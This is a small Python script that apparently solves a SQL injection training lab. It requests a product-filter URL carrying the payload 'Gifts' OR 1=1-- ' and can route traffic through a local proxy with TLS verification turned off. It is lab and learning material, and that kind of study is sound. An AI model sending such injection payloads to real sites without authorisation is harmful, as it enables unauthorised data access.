import sys
import logging
import argparse
import urllib3
import requests

PROXIES = {
    "http": "127.0.0.1:8080/",
    "https": "127.0.0.1:8080/",
}

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S",
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def parse_args(args: list):
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-n", "--no-proxy", default=False, action="store_true", help="do not use proxy"
    )
    parser.add_argument("url", help="url of lab")
    return parser.parse_args(args)

def normalize_url(url):
    if not url.endswith("/"):
        url = url + "/"
    return url

def main(args):
    url = normalize_url(args.url)
    exploit_url = url + "filter?category=Gifts' OR 1=1-- "
    log.info(f"Getting url: {exploit_url}")
    if args.no_proxy:
        resp = requests.get(exploit_url)
    else:
        resp = requests.get(exploit_url, proxies=PROXIES, verify=False)
    if resp.status_code == 200:
        log.info("lab should now be solved")

if __name__ == '__main__':
    args = parse_args(sys.argv[1:])  # Pass command-line arguments excluding the script name
    main(args)
